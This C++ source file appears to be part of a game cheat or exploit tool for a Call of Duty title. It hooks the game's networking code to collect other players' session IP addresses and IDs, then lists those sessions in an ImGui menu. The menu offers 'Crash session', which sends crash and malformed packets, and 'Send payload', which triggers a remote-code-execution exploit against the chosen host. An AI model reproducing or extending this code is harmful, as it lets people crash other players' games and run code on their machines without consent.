#include "dependencies/std_include.hpp"
#include "session.hpp"

namespace session
{
	struct sessions_t
	{
		game::XSESSION_INFO sessinfo;
		std::uint64_t session_id;
		std::uint32_t time;
		std::uint32_t clients;
		std::uint32_t max_clients;
		bool in_game;
		bool in_party;
		bool ignore;
		std::string map_name;
		std::string gametype;
	}; 

	bool enabled; 
	std::vector<sessions_t> sessions;
	
	bool can_add_to_session(const game::XNADDR& xnaddr)
	{
		for (const auto& session : sessions)
		{
			if (game::NET_CompareXNAddr(&session.sessinfo.hostAddress, &xnaddr))
				return false;
		}

		return true;
	}

	game::netadr_t get_net_adr(const game::XSESSION_INFO& info)
	{
		game::netadr_t netadr{};
		game::dwRegisterSecIDAndKey(&info.sessionID, &info.keyExhangeKey);
		game::dwCommonAddrToNetadr(&netadr, &info.hostAddress, &info.sessionID);
		game::dwUpdateNetadr(&netadr);

		return netadr;
	}

	bool is_session_in_party(const std::string& party_id) {
		return party_id[0] != '0';
	}

	bool is_valid_session(const sessions_t& session)
	{
		if (!session.session_id)
			return false;

		if (!session.clients && !session.max_clients)
			return false;

		return true;
	}

	void remove_sessions(const sessions_t& current_session)
	{
		const auto session = std::find_if(sessions.begin(), sessions.end(), [=](const auto& session)
			{
				if (session.time && current_session.time >= session.time + 60000)
					return true;

				return game::NET_CompareXNAddr(&session.sessinfo.hostAddress, &current_session.sessinfo.hostAddress) && !is_valid_session(session);
			});

		if (session != sessions.end())
		{
			PRINT_LOG("Removing session '%s' ..", utils::string::adr_to_string(&session->sessinfo.hostAddress).data());
			sessions.erase(session);
		}
	}

	void update_sessions(const sessions_t& current_session)
	{
		std::replace_if(sessions.begin(), sessions.end(), [=](const auto& session)
			{
				return game::NET_CompareXNAddr(&session.sessinfo.hostAddress, &current_session.sessinfo.hostAddress) && !session.ignore;
			}, current_session);

		remove_sessions(current_session);
	}

	void session_list()
	{
		const auto join_session = [=](const game::XSESSION_INFO& sessinfo)
		{
			game::PartyAtomic_AcceptInviteMP(0, &sessinfo, false);
			PRINT_LOG("Joining session '%s' ..", utils::string::adr_to_string(&sessinfo.hostAddress).data());
		};

		if (ImGui::BeginTabItem("Sessions"))
		{
			const auto width = ImGui::GetContentRegionAvail().x;
			const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

			if (ImGui::MenuItem("Grab info of joined sessions", nullptr, enabled))
			{
				enabled = !enabled;
			}

			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
			ImGui::BeginColumns("Sessions", 3, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Session");
			ImGui::NextColumn();
			ImGui::SetColumnOffset(-1, width - ImGui::CalcTextSize("Clients").x);
			ImGui::TextUnformatted("Clients");
			ImGui::NextColumn();

			ImGui::Separator();

			std::vector<std::uint32_t> indices{};

			for (size_t i = 0; i < sessions.size(); ++i)
			{
				indices.emplace_back(i);
			}

			std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b)
				{
					return sessions[a].clients > sessions[b].clients;
				});

			for (const auto& session_num : indices)
			{
				if (auto& session = sessions[session_num]; is_valid_session(session))
				{
					ImGui::AlignTextToFramePadding();

					ImGui::TextUnformatted(std::to_string(session_num));

					ImGui::NextColumn();

					ImGui::PushStyleColor(ImGuiCol_Text, session.in_game ? ImColor(0, 255, 127, 250).Value : ImColor(200, 200, 200, 250).Value);

					ImGui::AlignTextToFramePadding();

					const auto ip_string = utils::string::adr_to_string(&session.sessinfo.hostAddress);
					const auto selected = ImGui::Selectable((ip_string + "##"s + std::to_string(session_num)));

					ImGui::PopStyleColor();

					if (game::party->currentHost.sessionInfo.sessionID.id == session.session_id)
					{
						ImGui::SameLine(0, spacing);

						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.5f, 0.95f), "[Current]");
					}

					if (session.ignore)
					{
						ImGui::SameLine(0, spacing);

						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.5f, 0.95f), "[Ignored]");
					}

					const auto popup = "session_popup##" + std::to_string(session_num);
					static game::netadr_t netadr{};

					if (selected)
					{
						netadr = get_net_adr(session.sessinfo);
						exploit::pm = {};

						ImGui::OpenPopup(popup.data());
					}

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						if (ImGui::MenuItem(ip_string + "##session_menu_item"))
						{
							ImGui::LogToClipboardUnformatted(ip_string);
						}

						if (ImGui::MenuItem(std::to_string(session.session_id)))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(session.session_id));
						}

						if (!session.map_name.empty() && !session.gametype.empty())
						{
							ImGui::MenuItem(session.map_name);
							ImGui::MenuItem(session.gametype);
						}

						ImGui::Separator();

						if (ImGui::MenuItem("Ignore session", nullptr, session.ignore))
						{
							session.ignore = !session.ignore;
						}

						if (ImGui::MenuItem("Join session"))
						{
							join_session(session.sessinfo);
						}

						ImGui::Separator();

						if (ImGui::MenuItem("Crash session"))
						{
							exploit::send_relay_crash_packet(game::party, netadr);
							exploit::send_print_packet(netadr, "^\x01==\x80");
						}

						if (ImGui::BeginMenu("Send payload"))
						{
							const auto rce_cmd = menu::get_rce_commands(width);

							if (ImGui::MenuItem("Execute"))
							{
								if (const auto args = utils::string::split(rce_cmd.first, ' '); !args.empty())
								{
									exploit::member_join::send_payload(netadr, rce_cmd.second, args);
								}
								else
								{
									exploit::member_join::send_payload(netadr, rce_cmd.second);
								}
							}

							ImGui::EndMenu();
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					ImGui::AlignTextToFramePadding();

					ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "%u/%u", session.clients, session.max_clients);

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::PopStyleVar();
			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}

	bool __cdecl potential_host_xenon_register_remote_xenon(const game::XSESSION_INFO* info, in_addr* addr, std::uint16_t* port)
	{
		if (info->sessionID.id)
		{
			const auto xnaddr_ip_string = utils::string::adr_to_string(&info->hostAddress);

			for (const auto& session : session::sessions)
			{
				if (info->sessionID.id == session.session_id)
				{
					if (session.ignore)
					{
						PRINT_LOG("Ignoring potential host '%s' ..", xnaddr_ip_string.data());
						return false;
					}
				}
			}

			if (can_add_to_session(info->hostAddress))
				sessions.emplace_back(sessions_t{ *info });

			PRINT_LOG("Joining potential host '%s' ..", xnaddr_ip_string.data());
		}

		if (!enabled)
		{
			return reinterpret_cast<decltype(&potential_host_xenon_register_remote_xenon)>(0x005CE250)(info, addr, port);
		}

		return false;
	}

	void initialize()
	{
		utils::hook::call(0x00632AB6, &potential_host_xenon_register_remote_xenon);

		scheduler::loop([]()
		{
			for (const auto& session : sessions)
			{
				const auto netadr = get_net_adr(session.sessinfo);

				if (netadr.inaddr && netadr.inaddr != 0xFF00FF00 && netadr.type != game::NA_LOOPBACK)
				{
					const auto party_id = session.in_game ? 0 : 2;
					const auto data = std::to_string(party_id) + "hping " + std::to_string(game::Sys_Milliseconds());
					exploit::send(netadr, data);

					if (session.in_game)
						exploit::send(netadr, "getinfo", game::NS_CLIENT1);
				}
			}

		}, scheduler::pipeline::main, 1s);

		network::on_command("infoResponse", [](const auto& params, const auto& target, auto& msg)
		{
			char response[1024] = { 0 };
			const auto info_string = game::MSG_ReadString(&msg, response, sizeof response);
			const auto map_name = game::Info_ValueForKey(info_string, "mapname");
			const auto gametype = game::Info_ValueForKey(info_string, "gametype");

			game::XNADDR xnaddr = {};
			if (game::dwNetadrToCommonAddr(target, &xnaddr, sizeof game::XNADDR, nullptr))
			{
				for (auto& session : sessions)
				{
					if (game::NET_CompareXNAddr(&session.sessinfo.hostAddress, &xnaddr))
					{
						session.map_name = map_name;
						session.gametype = gametype;
					}
				}
			}

			return true;
		});

		network::on_command("hpong", [](const auto& params, const auto& target, const auto& msg)
		{
			const auto session_id = game::StringToInt64(params[1]);
			const auto time = utils::atoi(params[2]);
			const auto in_game = utils::atoi<bool>(params[3]);
			const auto current_clients = utils::atoi(params[4]);
			const auto max_clients = utils::atoi(params[5]);

			for (const auto& session : sessions)
			{
				if (session.sessinfo.sessionID.id == session_id && current_clients <= max_clients)
					update_sessions({ session.sessinfo, session_id, time, current_clients, max_clients, in_game, is_session_in_party(params[0]), session.ignore, !session.in_game ? "" : session.map_name, !session.in_game ? "" : session.gametype });
			}

			return false;
		});
	}
}
